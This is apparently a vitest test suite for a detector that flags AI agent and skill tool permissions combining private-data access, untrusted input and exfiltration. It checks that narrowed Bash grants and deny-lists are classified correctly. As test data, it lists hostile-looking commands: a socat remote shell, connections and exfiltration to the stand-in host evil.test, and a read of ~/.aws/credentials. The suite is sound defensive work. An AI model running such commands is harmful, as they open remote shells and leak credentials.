/**
 * Lethal-trifecta detector suite (vitest) — the headline Safety check. Asserts
 * the Rule of Two: ≤ 2 legs is clean, all 3 is a finding; `Bash` is dual (A+C) so
 * Bash + a leg-B tool already fires; inherits-all is advisory, an explicit
 * all-three is hard; MCP tools classify per leg; unknown tools map to nothing.
 */
import { test } from "vitest";
import assert from "node:assert/strict";

import {
  classifyTrifectaLegs,
  lethalTrifectaIssues,
  skillFenceLegs,
  skillTrifectaIssue,
  dialectSupportsSkillFence,
} from "./lethal-trifecta.js";
import { claudeCodeDialect } from "../adapters/claude-code/dialect.js";
import { codexDialect } from "../adapters/codex/dialect.js";

test("clean 2-of-3 (Read + WebFetch, no exfil-only leg beyond fetch) → ...", () => {
  // Read (leg A) + WebSearch (leg B only) — no exfil leg → safe.
  assert.equal(
    lethalTrifectaIssues(["Read", "WebSearch"], claudeCodeDialect),
    null,
  );
});

test("explicit all-three → a hard finding naming each leg", () => {
  // Read (A) + WebSearch (B) + WebFetch (C, also B) → all three legs.
  const finding = lethalTrifectaIssues(
    ["Read", "WebSearch", "WebFetch"],
    claudeCodeDialect,
  );
  assert.notEqual(finding, null);
  assert.equal(finding?.severity, "hard");
  assert.ok(finding && finding.legs.private.includes("Read"));
  assert.ok(finding && finding.legs.untrusted.includes("WebSearch"));
  assert.ok(finding && finding.legs.exfil.includes("WebFetch"));
  assert.match(finding?.message ?? "", /Lethal trifecta/);
});

test("Bash is dual (A+C): Bash alone covers two legs, Bash+WebFetch fires", () => {
  const legs = classifyTrifectaLegs(["Bash"], claudeCodeDialect);
  assert.ok(legs.private.includes("Bash"));
  assert.ok(legs.exfil.includes("Bash"));
  assert.equal(legs.untrusted.length, 0);
  // Bash alone (A+C, no B) → not a trifecta.
  assert.equal(lethalTrifectaIssues(["Bash"], claudeCodeDialect), null);
  // Bash (A+C) + WebFetch (B) → all three.
  const finding = lethalTrifectaIssues(["Bash", "WebFetch"], claudeCodeDialect);
  assert.notEqual(finding, null);
  assert.equal(finding?.severity, "hard");
});

test("a Tool(restriction) suffix is stripped before classifying", () => {
  // Bash(git:*) still classifies as Bash (A+C); + WebSearch (B) → trifecta.
  const finding = lethalTrifectaIssues(
    ["Bash(git:*)", "WebSearch"],
    claudeCodeDialect,
  );
  assert.notEqual(finding, null);
  assert.ok(finding && finding.legs.private.includes("Bash"));
});

test("EXPLICIT empty contract ([]) → NO finding (zero tools can't hold a leg)", () => {
  // The caller passes `["*"]` for inherits-all; a literal `[]` means the unit
  // declared zero tools, so it cannot form a trifecta (don't collapse the two).
  assert.equal(lethalTrifectaIssues([], claudeCodeDialect), null);
});

test("inherits-all (wildcard '*') → an advisory finding", () => {
  const finding = lethalTrifectaIssues(["*"], claudeCodeDialect);
  assert.notEqual(finding, null);
  assert.equal(finding?.severity, "advisory");
  assert.match(finding?.message ?? "", /no explicit tools/);
});

test("an unreadable contract whose SALVAGE names all three legs still convicts", () => {
  // One-directional: a salvage may make the verdict worse, never better. A real
  // vendored plugin (madappgang's tester.md) is exactly this shape — malformed
  // block, explicit all-three tool list — and demoting it to advisory would lose
  // a genuine exfil path.
  const finding = lethalTrifectaIssues(
    ["Read", "WebSearch", "WebFetch"],
    claudeCodeDialect,
    { contractUnreadable: true },
  );
  assert.equal(finding?.severity, "hard");
  assert.match(finding?.message ?? "", /Lethal trifecta/);
  assert.match(finding?.message ?? "", /SALVAGED/);
});

test("an unreadable contract that reads NARROW falls back to inherits-all", () => {
  // The defect itself: Read + Bash is private + exfil with no untrusted leg, so
  // the salvage scored CLEAN. What a strict loader yields from that block is no
  // contract at all — every leg.
  const finding = lethalTrifectaIssues(["Read", "Bash"], claudeCodeDialect, {
    contractUnreadable: true,
  });
  assert.equal(finding?.severity, "advisory");
  assert.match(finding?.message ?? "", /not valid YAML/);
  // …and the same list in a block that PARSES is still clean (Rule of Two).
  assert.equal(lethalTrifectaIssues(["Read", "Bash"], claudeCodeDialect), null);
});

test("an UNREADABLE contract says so, instead of 'no explicit tools'", () => {
  // The caller (scan-core) passes the wildcard when the frontmatter block exists
  // but js-yaml rejects it. Same severity, different sentence: telling an author
  // who plainly declared `allowed-tools:` that they declared no tools sends them
  // hunting the wrong bug. Name the YAML, and name what it was scored as instead.
  const finding = lethalTrifectaIssues(["*"], claudeCodeDialect, {
    contractUnreadable: true,
  });
  assert.equal(finding?.severity, "advisory");
  assert.match(finding?.message ?? "", /not valid YAML/);
  assert.match(finding?.message ?? "", /INHERITS-ALL/);
  assert.doesNotMatch(finding?.message ?? "", /no explicit tools/);
});

test("mcp__* servers classify per leg (github get_file=A, fetch=B, github PR=C)", () => {
  const legs = classifyTrifectaLegs(
    [
      "mcp__github__get_file_contents",
      "mcp__fetch__fetch",
      "mcp__github__create_pull_request",
    ],
    claudeCodeDialect,
  );
  assert.ok(legs.private.includes("mcp__github__get_file_contents"));
  assert.ok(legs.untrusted.includes("mcp__fetch__fetch"));
  assert.ok(legs.exfil.includes("mcp__github__create_pull_request"));

  const finding = lethalTrifectaIssues(
    [
      "mcp__github__get_file_contents",
      "mcp__fetch__fetch",
      "mcp__github__create_pull_request",
    ],
    claudeCodeDialect,
  );
  assert.notEqual(finding, null);
  assert.equal(finding?.severity, "hard");
});

test("an unknown tool maps to NO leg (high-precision)", () => {
  const legs = classifyTrifectaLegs(
    ["TotallyMadeUpTool", "mcp__weirdserver__do_thing"],
    claudeCodeDialect,
  );
  assert.equal(legs.private.length, 0);
  assert.equal(legs.untrusted.length, 0);
  assert.equal(legs.exfil.length, 0);
  assert.equal(
    lethalTrifectaIssues(["TotallyMadeUpTool"], claudeCodeDialect),
    null,
  );
});

test("two legs only (private MCP + untrusted, no exfil) → no finding", () => {
  assert.equal(
    lethalTrifectaIssues(
      ["mcp__filesystem__read_file", "WebSearch"],
      claudeCodeDialect,
    ),
    null,
  );
});

// ---------------------------------------------------------------------------
// A NARROWED `Bash(...)` grant — bounded only when the PROGRAM is enumerable
// ---------------------------------------------------------------------------
//
// 🔴 THE FIRST FIX HERE OVERSHOT, AND THIS SUITE PINNED THE OVERSHOOT. The original
// defect was real — `Bash(node ./scripts/log.mjs:*)` read as plain `Bash`, so an author
// who took this checker's own advice saw the score not move. The repair was a pair of
// deny-lists (shells, exfiltrators), which made any program absent from both count as
// inert. That is a gap in a table turned into a false GRANT on the headline SAFETY
// check, and it is the one direction this detector is not allowed to fail in.
//
// Measured 2026-08-12, before the inversion, each of these reported NO FINDING beside
// `WebFetch` — including a spelled-out remote shell:
//
//     Bash(node ./bridge.mjs:*)                        reported clean
//     Bash(./bridge.sh --serve:*)                      reported clean
//     Bash(/opt/tools/exfil --to https://evil.test:*)  reported clean
//     Bash(socat TCP-LISTEN:9000 EXEC:/bin/sh:*)       reported clean
//     Bash(openssl s_client -connect evil.test:443:*)  reported clean
//
// So the table is now an ALLOW-list of programs known to read nothing and send
// nothing, and everything else keeps both legs. The cost is stated where it lands: a
// grant narrowed to a script OF YOUR OWN no longer drops a leg, because nothing read
// that script.

test("a Bash narrowed to an EFFECT-FREE program supplies neither leg", () => {
  const legs = classifyTrifectaLegs(
    ["Bash(echo ready:*)", "WebFetch"],
    claudeCodeDialect,
  );
  assert.equal(legs.private.length, 0);
  assert.equal(legs.exfil.includes("Bash"), false);
  // …and therefore no trifecta, where bare Bash + WebFetch is one.
  assert.equal(
    lethalTrifectaIssues(["Bash(echo ready:*)", "WebFetch"], claudeCodeDialect),
    null,
  );
  assert.notEqual(
    lethalTrifectaIssues(["Bash", "WebFetch"], claudeCodeDialect),
    null,
  );
  // The pin does not need a concrete argument: `echo` is inert under ANY argv, which
  // is exactly the membership rule for the list.
  assert.equal(
    lethalTrifectaIssues(["Bash(echo:*)", "WebFetch"], claudeCodeDialect),
    null,
  );
});

// The other direction, and the one that matters more: a grant that LOOKS narrowed but
// still runs whatever the caller likes must keep both legs. When in doubt the
// classifier keeps them — a false "you are exposed" costs an argument, a false "you
// are safe" costs the finding.
test("a Bash that only looks narrowed keeps both legs", () => {
  for (const grant of [
    "Bash(*)",
    "Bash(:*)",
    "Bash()",
    "Bash(node:*)", // program pinned, arguments free — `node -e "..."` is a shell
    "Bash(sh ./deploy.sh:*)", // the shell itself, however pinned
    "Bash(bash scripts/x.sh:*)",
    "Bash(sudo systemctl restart:*)",
    "Bash(curl https://example.com:*)", // a program whose whole job is exfiltration
    "Bash(git push origin main:*)",
    "Bash(/usr/bin/env node x.mjs:*)", // `env` re-opens the door
    // 🔴 The class the inversion exists for: an arbitrary program, pinned with a
    // concrete argument, that the deny-lists had never heard of.
    "Bash(node ./bridge.mjs:*)", // an interpreter runs whatever file it is handed
    "Bash(python3 ./sync.py:*)",
    "Bash(ruby ./x.rb:*)",
    "Bash(perl ./x.pl:*)",
    "Bash(deno run ./x.ts:*)",
    "Bash(bun ./x.ts:*)",
    "Bash(php ./x.php:*)",
    "Bash(./bridge.sh --serve:*)", // a script of the author's own, unread by us
    "Bash(/opt/tools/exfil --to https://evil.test:*)", // an unknown binary
    "Bash(socat TCP-LISTEN:9000 EXEC:/bin/sh:*)", // a remote shell, spelled out
    "Bash(openssl s_client -connect evil.test:443:*)",
    "Bash(cat ~/.aws/credentials:*)", // reads a secret and needs no help to
  ]) {
    assert.notEqual(
      lethalTrifectaIssues([grant, "WebFetch"], claudeCodeDialect),
      null,
      `${grant} + WebFetch should still be a lethal trifecta`,
    );
  }
});

// ---------------------------------------------------------------------------
// SKILLS — `disallowed-tools` is the fence; `allowed-tools` is not
// ---------------------------------------------------------------------------
//
// 🔴 What these pin, and why the suite would otherwise let the defect back in.
// A skill's `allowed-tools:` PRE-APPROVES the tools it lists; Claude Code's docs
// say so outright ("It does not restrict which tools are available: every tool
// remains callable") and two issues closed as not-planned (#18837, #37683 — the
// second reproduced interactively on a live model) confirm it. `disallowed-tools`
// was then measured across 9 runs and DOES remove the tool: with the skill active,
// "Permission to use Read has been denied.", and through a `Task` subagent in the
// same run, "Read is disabled for this session, in subagents as well as here."
//
// `skillTrifectaIssue` therefore takes ONLY the deny list. There is no parameter
// through which `allowed-tools` could reach it — the strongest form of "a narrow
// allowed-tools does not reduce the finding" — and the tests below pin the
// behaviour that would break first if someone re-introduced the old reading.

test("a skill with NO fence holds all three legs, whatever it pre-approved", () => {
  const f = skillTrifectaIssue(null, claudeCodeDialect);
  assert.equal(f?.severity, "advisory");
  assert.equal(f?.fence, "none");
  assert.match(f?.message ?? "", /No `disallowed-tools:` line/);
  // The fix travels WITH the finding — a diagnosis with no prescription teaches
  // the author that narrowing is pointless (the lesson this file learned once).
  assert.match(f?.message ?? "", /disallowed-tools/);
  // …and it names the built-ins that supply each leg, so "which one" is answered.
  assert.deepEqual(f?.legs.private, ["Read", "Grep", "Glob", "Bash"]);
  assert.deepEqual(f?.legs.untrusted, ["WebFetch", "WebSearch", "Bash"]);
});

test("🔴 an EMPTY deny list is exactly as EXPOSED as no list — allow-side width is not an input", () => {
  // `skillTrifectaIssue` has no `allowed-tools` parameter at all, so the only way
  // to express "declared a lot" vs "declared a little" is the deny list. Both
  // degenerate deny lists must produce the same exposure; if a future change adds
  // an allow-side parameter that narrows the legs, this pair diverges.
  const none = skillTrifectaIssue(null, claudeCodeDialect);
  const empty = skillTrifectaIssue([], claudeCodeDialect);
  assert.notEqual(none, null);
  assert.equal(empty?.severity, none?.severity);
  assert.deepEqual(empty?.legs, none?.legs);
});

test("🔴 …but an EXPLICIT `disallowed-tools: []` is an ATTEMPT, not a missing line", () => {
  // The two states differ in what the AUTHOR did, and the doc contract on
  // `skillTrifectaIssue` always said so — the code folded them together anyway.
  // The damage was ROUTING, not wording: `fence: "none"` is swept into the
  // whole-surface aggregate ("N of M skills declare no tool fence"), so the one
  // author who reached for the field and got nothing from it was the one who
  // never got a line of their own.
  const empty = skillTrifectaIssue([], claudeCodeDialect);
  assert.equal(empty?.fence, "ineffective");
  assert.match(empty?.message ?? "", /declared but EMPTY/);
  // It must NOT claim the line is absent — that is the sentence which sends an
  // author looking for something they have already written.
  assert.doesNotMatch(empty?.message ?? "", /No `disallowed-tools:` line/);
  // The absent case keeps saying exactly that.
  const none = skillTrifectaIssue(null, claudeCodeDialect);
  assert.equal(none?.fence, "none");
  assert.match(none?.message ?? "", /No `disallowed-tools:` line/);
  // 🔴 Unreadable frontmatter is NOT an attempt: a strict loader parses no block,
  // so whatever it appears to declare denies nothing and it stays in the aggregate.
  const broken = skillTrifectaIssue([], claudeCodeDialect, {
    contractUnreadable: true,
  });
  assert.equal(broken?.fence, "none");
  assert.match(broken?.message ?? "", /not valid YAML/);
});

test("a fence that closes a WHOLE leg clears the finding (Rule of Two)", () => {
  // Untrusted-intake and exfiltration share their built-in suppliers, so one line
  // closes both and leaves only private-data read standing.
  assert.equal(
    skillTrifectaIssue(["WebFetch", "WebSearch", "Bash"], claudeCodeDialect),
    null,
  );
  // The other direction: closing private-data read alone is also enough.
  assert.equal(
    skillTrifectaIssue(["Read", "Grep", "Glob", "Bash"], claudeCodeDialect),
    null,
  );
});

test("a PARTIAL fence closes nothing and is never graded louder than no fence", () => {
  const partial = skillTrifectaIssue(["WebFetch"], claudeCodeDialect);
  assert.equal(partial?.fence, "ineffective");
  assert.match(partial?.message ?? "", /closes no lethal-trifecta leg/);
  // WebSearch and Bash still supply both network legs.
  assert.deepEqual(partial?.legs.untrusted, ["WebSearch", "Bash"]);
  // 🔴 Severity parity is load-bearing. An ineffective fence has capability ≤ no
  // fence, so grading it HARDER would repeat the non-monotonicity this detector
  // was already fixed for once (declaring a contract could only lower the score).
  const nothing = skillTrifectaIssue(null, claudeCodeDialect);
  assert.equal(partial?.severity, nothing?.severity);
});

test("a RESTRICTED deny does not remove the tool: `Bash(curl:*)` leaves the shell", () => {
  // The mirror of `bashGrantIsUnbounded` on the allow side. Denying one pattern
  // leaves every other command, so the shell keeps supplying all three legs.
  const legs = skillFenceLegs(
    ["WebFetch", "WebSearch", "Bash(curl:*)"],
    claudeCodeDialect,
  );
  assert.ok(legs.exfil.includes("Bash"));
  assert.notEqual(
    skillTrifectaIssue(
      ["WebFetch", "WebSearch", "Bash(curl:*)"],
      claudeCodeDialect,
    ),
    null,
  );
});

test("an unreadable block is not a fence, and the message says so", () => {
  // The salvage would read `WebFetch, WebSearch, Bash` and close two legs. A strict
  // loader reads no frontmatter at all, so the fence denies nothing — one-directional,
  // exactly as on the subagent path: a salvage may convict, never acquit.
  const f = skillTrifectaIssue(
    ["WebFetch", "WebSearch", "Bash"],
    claudeCodeDialect,
    {
      contractUnreadable: true,
    },
  );
  assert.equal(f?.fence, "none");
  assert.match(f?.message ?? "", /not valid YAML/);
});

test("the remedy names only tools THIS harness ships (no Codex `shell` in a CC message)", () => {
  // `FENCE_SUPPLIERS` carries every dialect's shell name so the check generalizes;
  // telling a Claude Code author to deny `shell` would be cry-wolf, and would make
  // the leg unclosable in practice.
  const f = skillTrifectaIssue(null, claudeCodeDialect);
  assert.doesNotMatch(f?.message ?? "", /shell/);
  assert.equal(f?.legs.private.includes("shell"), false);
});

// ─── the skill fence is a Claude Code MECHANISM, not a universal one ──────────
//
// 🔴 Applied to every harness, this reported every Codex skill as holding all
// three legs, scored it against Safety, and told the author to add a
// `disallowed-tools:` line — a key Codex does not read and our own compiler drops
// under its `skillFrontmatterKeys: ["name", "description"]`. The work gets done, the finding
// comes back, the score never moves. Both halves below: SILENT where the fence
// does not exist, and unchanged where it does.

test("a harness with no skill fence gets no skill-fence finding", () => {
  // Every input that fires on Claude Code, on a minimal-profile dialect.
  for (const declared of [null, [], ["WebFetch"]] as const) {
    assert.equal(
      skillTrifectaIssue(declared, codexDialect),
      null,
      JSON.stringify(declared),
    );
  }
  assert.equal(
    skillTrifectaIssue(["WebFetch"], codexDialect, {
      contractUnreadable: true,
    }),
    null,
  );
  assert.equal(dialectSupportsSkillFence(codexDialect), false);
});

test("…and the Claude Code path is untouched by that gate", () => {
  // The QUIET half. A gate that suppressed everything would pass the test above
  // and silently delete the headline Safety detector.
  assert.equal(dialectSupportsSkillFence(claudeCodeDialect), true);
  assert.equal(skillTrifectaIssue(null, claudeCodeDialect)?.fence, "none");
  assert.equal(skillTrifectaIssue([], claudeCodeDialect)?.fence, "ineffective");
  assert.equal(
    skillTrifectaIssue(["WebFetch"], claudeCodeDialect)?.fence,
    "ineffective",
  );
  // …and a fence that really closes a leg is still clean, on the same dialect.
  assert.equal(
    skillTrifectaIssue(["WebFetch", "WebSearch", "Bash"], claudeCodeDialect),
    null,
  );
});

// ---------------------------------------------------------------------------
// The remedy is split by CAUSE — a check that fires on every unit carries no
// information unless it says why THIS unit fired.
//
// MEASURED: after `allowed-tools:` stopped counting as a bound, a real 38-skill
// repo went 18 of 38 exposed → 38 of 38, Safety 86 → 70. The classification is
// right; the single sentence "Drop at least one leg" was identical for three
// situations needing three different actions, and it pointed at narrowing
// `Bash(...)` — a door `EFFECT_FREE` has closed for anything an author actually
// runs. These tests pin the split, and each asserts BOTH the sentence it must
// carry and the one it must not.
// ---------------------------------------------------------------------------

test("remedy (a) unrestricted shell: name the one edit that closes it", () => {
  const m =
    lethalTrifectaIssues(["Read", "WebFetch", "Bash"], claudeCodeDialect)
      ?.message ?? "";
  assert.match(m, /Bash alone supplies two of the three legs/);
  // It must still WARN that narrowing is nearly useless, rather than recommend it.
  assert.match(m, /only helps for a program whose effects are enumerable/);
  assert.doesNotMatch(m, /narrowed but still counts/);
});

test("remedy (b) a NARROWED shell grant that still counts: say why, do not re-recommend narrowing", () => {
  // The worst of the three: this author already took the old advice.
  const m =
    lethalTrifectaIssues(
      ["Read", "WebFetch", "Bash(node ./x.mjs:*)"],
      claudeCodeDialect,
    )?.message ?? "";
  assert.match(m, /`Bash\(node \.\/x\.mjs:\*\)` is narrowed but still counts/);
  assert.match(m, /narrowing further will not move this finding/);
  // …and it must name a remedy that actually works.
  assert.match(m, /remove Bash from the contract/);
});

test("remedy (c) no shell leg: there is nothing to narrow, so do not imply there is", () => {
  const named =
    lethalTrifectaIssues(["Read", "WebSearch", "WebFetch"], claudeCodeDialect)
      ?.message ?? "";
  assert.match(named, /No shell grant supplies a leg here/);
  assert.doesNotMatch(named, /Bash alone supplies/);

  // 🔴 The same branch must cover a shell grant that IS present but BOUNDED.
  // `Bash(echo ready:*)` contributes no leg, so telling this author to remove
  // Bash would send them to undo the one narrowing that worked. The first draft
  // of this branch keyed on "a shell is named" and got exactly that wrong.
  const bounded =
    lethalTrifectaIssues(
      ["Read", "WebFetch", "Bash(echo ready:*)"],
      claudeCodeDialect,
    )?.message ?? "";
  assert.match(bounded, /No shell grant supplies a leg here/);
  assert.doesNotMatch(bounded, /remove Bash from the contract/);
});

test("the three remedies are actually DIFFERENT text", () => {
  // The whole point. If a refactor collapses them back to one sentence, this
  // fails even though every message still 'mentions the legs'.
  const messages = [
    ["Read", "WebFetch", "Bash"],
    ["Read", "WebFetch", "Bash(node ./x.mjs:*)"],
    ["Read", "WebSearch", "WebFetch"],
  ].map((tools) => lethalTrifectaIssues(tools, claudeCodeDialect)?.message);
  assert.equal(new Set(messages).size, 3);
  // Classification is untouched by any of this: all three are still `hard`.
  for (const tools of [
    ["Read", "WebFetch", "Bash"],
    ["Read", "WebFetch", "Bash(node ./x.mjs:*)"],
    ["Read", "WebSearch", "WebFetch"],
  ]) {
    assert.equal(
      lethalTrifectaIssues(tools, claudeCodeDialect)?.severity,
      "hard",
    );
  }
  // And a bounded grant still drops the legs it always did — text work must not
  // move the line between found and not-found.
  assert.equal(
    lethalTrifectaIssues(["Read", "Bash(echo ready:*)"], claudeCodeDialect),
    null,
  );
});

test("skill fence: a RESTRICTED deny is DISCARDED, and the message says so", () => {
  // `Bash(curl:*)` is not weighed and found wanting — it is thrown away, because
  // denying one invocation of the shell says nothing about the rest of it. The
  // generic "a leg is closed only when EVERY built-in is denied" sent that author
  // to add more restricted denies and watch nothing happen.
  const all = skillTrifectaIssue(["Bash(curl:*)"], claudeCodeDialect);
  assert.equal(all?.fence, "ineffective"); // classification unchanged
  assert.match(all?.message ?? "", /RESTRICTED deny is discarded, not weighed/);
  assert.match(all?.message ?? "", /Every entry in this fence is restricted/);

  // A MIXED fence: one real deny that does not close a whole leg, one discarded.
  const mixed = skillTrifectaIssue(
    ["WebFetch", "Bash(curl:*)"],
    claudeCodeDialect,
  );
  assert.match(mixed?.message ?? "", /`Bash\(curl:\*\)` denies nothing/);
  assert.match(mixed?.message ?? "", /unrestricted entries that remain/);
  assert.doesNotMatch(mixed?.message ?? "", /Every entry in this fence/);

  // A fence with NO restricted entry keeps the original wording — the split must
  // not relabel the plain "you did not cover a whole leg" case.
  const plain = skillTrifectaIssue(["WebFetch"], claudeCodeDialect);
  assert.match(plain?.message ?? "", /closes no lethal-trifecta leg/);
  assert.doesNotMatch(plain?.message ?? "", /discarded/);

  // And an EFFECTIVE fence is still clean — text work moved no verdict.
  assert.equal(
    skillTrifectaIssue(["WebFetch", "WebSearch", "Bash"], claudeCodeDialect),
    null,
  );
});
